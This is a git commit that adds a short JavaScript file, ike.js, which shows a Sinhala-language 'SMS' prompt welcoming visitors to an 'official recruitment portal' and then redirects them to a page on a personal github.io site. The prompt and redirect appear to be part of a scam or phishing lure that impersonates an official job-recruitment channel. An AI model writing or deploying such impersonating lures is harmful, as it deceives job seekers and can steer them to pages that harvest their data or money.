61aa5f03fe6d4d69fc528cf955b772a327c7eb0e
allregnws <promisebassey8081@gmail.com>
2025-04-21 19:10:52 +0100

    Create ike.js

---
+++ ike.js
@@ -0,0 +1,5 @@
+var password = 'මැතිවරණ'
+password=prompt('SMS :අපගේ නිල බඳවා ගැනීමේ ද්වාරයට සාදරයෙන් පිළිගනිමු. ඔබගේ අයදුම්පත ආරම්භ කිරීමට (OK) ක්ලික් කරන්න. ','මැතිවරණ');
+if (password != 'මැතිවරණ') {
+location.href='https://allregnws.github.io/Recruitment.portal.Ik';
+}
